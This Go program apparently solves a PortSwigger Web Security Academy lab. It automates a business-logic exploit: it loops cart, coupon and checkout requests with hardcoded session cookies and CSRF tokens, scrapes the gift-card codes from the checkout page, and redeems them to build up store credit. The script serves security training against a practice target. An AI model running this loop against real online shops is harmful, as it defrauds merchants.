package main

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"

	"github.com/PuerkitoBio/goquery"
)

type httpObject struct {
	Path   string
	Method string
	Params map[string]string
}

func httpReq(Method string, urlpath string, params map[string]string) (*http.Response, error) {
	client := &http.Client{}

	form := url.Values{}
	if Method == "POST" {
		for k, v := range params {
			form.Set(k, v)
		}
	}

	req, err := http.NewRequest(Method, urlpath, strings.NewReader(form.Encode()))
	if err != nil {
		return nil, err
	}

	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36")
	req.Header.Add("Origin", "https://ac9f1f191f3d491e806555d4005c0033.web-security-academy.net")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(form.Encode())))
	req.Header.Add("Cookie", `session=hTTdsrSfOsB6iTTd3BKgnno42nrjkpZO; session=2XOQhY9xF2JAYyzlpKXvcbJYCinR30rE`)

	// Print Request
	// reqDump, err := httputil.DumpRequest(req, true)
	// if err != nil {
	// 	return nil, err
	// }
	// fmt.Println(string(reqDump))

	resp, err := client.Do(req)

	// Print Response
	// respDump, err := httputil.DumpResponse(resp, true)
	// if err != nil {
	// 	return nil, err
	// }
	// fmt.Println(string(respDump))

	return resp, err
}

func redeem(coupon string, baseURL string) (*http.Response, error) {
	u := &httpObject{
		Path:   "gift-card",
		Method: "POST",
		Params: map[string]string{
			"csrf":      "O6uv7iVXz1dGfWAz8IumToVEnDcDMEu1",
			"gift-card": coupon,
		},
	}
	fmt.Printf("\n=== Request %s %s | coupon: %s\n", u.Method, u.Path, coupon)

	return httpReq(u.Method, baseURL+u.Path, u.Params)
}

func main() {
	var err error
	var resp *http.Response

	baseURL := "https://ac9f1f191f3d491e806555d4005c0033.web-security-academy.net/"
	// baseURL := "https://ac651f351e5dbd4a80b7305d00f30014.free.beeceptor.com/"

	coupons := []string{}
	couponIndex := 0

	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/cart
	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/cart/coupon
	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/cart/checkout
	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/cart/order-confirmation?order-confirmed=true
	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/gift-card
	urls := []httpObject{
		{
			Path:   "cart",
			Method: "POST",
			Params: map[string]string{
				"productId": "2",
				"quantity":  "20",
				"redir":     "CART",
			},
		},
		{
			Path:   "cart/coupon",
			Method: "POST",
			Params: map[string]string{
				"csrf":   "O6uv7iVXz1dGfWAz8IumToVEnDcDMEu1",
				"coupon": "SIGNUP30",
			},
		},
		{
			Path:   "cart/checkout",
			Method: "POST",
			Params: map[string]string{
				"csrf": "O6uv7iVXz1dGfWAz8IumToVEnDcDMEu1",
			},
		},
		// {
		// 	Path:     "cart/order-confirmation?order-confirmed=true",
		// 	Method: "GET",
		// },
		// {
		// 	Path:     "gift-card",
		// 	Method: "POST",
		// 	Params: map[string]string{
		// 		"csrf":      "O6uv7iVXz1dGfWAz8IumToVEnDcDMEu1",
		// 		"gift-card": "91HsiFhNz9",
		// 	},
		// },
	}

	for i := 0; i < 10; i++ { // repeat 10 times
		for _, u := range urls {
			// time.Sleep(time.Millisecond * 200)
			fmt.Printf("\n=== Request %s %s\n", u.Method, u.Path)
			// if u.Method == "GET" {
			// 	resp, err = httpReq(u.Method, baseURL+u.Path, nil)

			// } else {
			// if u.Path == "gift-card" {
			// 	u.Params["gift-card"] = coupons[couponIndex]
			// 	couponIndex++
			// }
			resp, err = httpReq(u.Method, baseURL+u.Path, u.Params)
			// }
			if err != nil {
				fmt.Println("error: ", err)
				break
			}

			// save coupon code
			if u.Path == "cart/checkout" {
				defer resp.Body.Close()
				if resp.StatusCode == 200 {
					// HTML SCRAPE
					// Load the HTML document
					doc, err := goquery.NewDocumentFromReader(resp.Body)
					if err != nil {
						log.Fatal(err)
					}

					// Find the coupon items
					doc.Find("table.is-table-numbers").Each(func(i int, tablehtml *goquery.Selection) {
						tablehtml.Find("tr").Each(func(indextr int, rowhtml *goquery.Selection) {
							rowhtml.Find("td").Each(func(indexth int, tablecell *goquery.Selection) {
								coupon := tablecell.Text()
								fmt.Printf("Coupon %d: %s\n", indextr, coupon)
								coupons = append(coupons, coupon)
							})
						})
					})
				}
			}

			fmt.Println("status: ", resp.Status)
		}
	}
	for _, coupon := range coupons {
		resp, err := redeem(coupon, baseURL)
		if err != nil {
			fmt.Println("error: ", err)
		}
		couponIndex++
		fmt.Println("status: ", resp.Status)
	}
}
